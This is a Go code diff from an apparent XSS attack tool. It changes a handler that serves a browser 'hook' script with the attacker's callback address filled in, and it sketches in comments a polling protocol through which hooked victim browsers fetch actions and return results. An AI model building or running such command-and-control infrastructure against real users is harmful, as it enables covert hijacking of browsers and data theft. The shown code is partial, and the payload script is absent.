@@ -103,32 +103,52 @@ func ServeXSS(currentFlags *core.Flags) (err error) {
 }
 
 func hookHandle(w http.ResponseWriter, r *http.Request) {
-	log.Println("[HOOK] Received request from ", r.Host)
+	log.Println("[HOOK] Received request from", r.Host)
 
-	w.Header().Set("Access-Control-Allow-Origin", "*")
-	w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
-	w.Header().Set("Content-type", "text/javascript")
-	hook, err := StaticFS.ReadFile("resources/xss/hook.js")
-	if err != nil {
-		log.Println("Could not locate hook.js file:", err)
-		log.Println(r)
+	if r.Method == "GET" {
+		w.Header().Set("Access-Control-Allow-Origin", "*")
+		w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
+		w.Header().Set("Content-type", "text/javascript")
+		hook, err := StaticFS.ReadFile("resources/xss/hook.js")
+		if err != nil {
+			log.Println("Could not locate hook.js file:", err)
+			log.Println(r)
+			return
+		}
+
+		var protocol, endpoint string
+		protocol = "http"
+		if flags.IsHTTPS {
+			protocol = "https"
+		}
+		endpoint = flags.XSSAddress
+		if flags.Domain != "" {
+			endpoint = flags.Domain
+		}
+		hook = bytes.ReplaceAll(hook, []byte("[[HOST_REPLACE_ME]]"), []byte(fmt.Sprintf("%v://%v:%v", protocol, endpoint, flags.XSSPort)))
+
+		_, err = w.Write(hook)
+		if err != nil {
+			log.Println("Failed to write response:", err)
+		}
 		return
 	}
 
-	var protocol, endpoint string
-	protocol = "http"
-	if flags.IsHTTPS {
-		protocol = "https"
-	}
-	endpoint = flags.XSSAddress
-	if flags.Domain != "" {
-		endpoint = flags.Domain
-	}
-	hook = bytes.ReplaceAll(hook, []byte("[[HOST_REPLACE_ME]]"), []byte(fmt.Sprintf("%v://%v:%v", protocol, endpoint, flags.XSSPort)))
+	if r.Method == "POST" {
+		w.Header().Set("Access-Control-Allow-Origin", "*")
+		w.Header().Set("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept")
+		w.Header().Set("Content-type", "text/javascript")
 
-	_, err = w.Write(hook)
-	if err != nil {
-		log.Println("Failed to write response:", err)
+		//if POST parse json and check:
+		//probe REQ: {"poll":"hearthbeat", "id":"id", "action_results":[]} //todo change ID to GUID to reduce likelihood of guessing the ID
+		//server RES: if actions available {"actions": {"action1":["options1"],"action2":["options2"]}}
+		
+		//if POST parse json and check:
+		//probe REQ: {"action_results":{"action1":{results},"action2":{results}}}}
+		//server RES: {"status":"ok"} || {"status":"error"}
+
+
+		return
 	}
 }
 
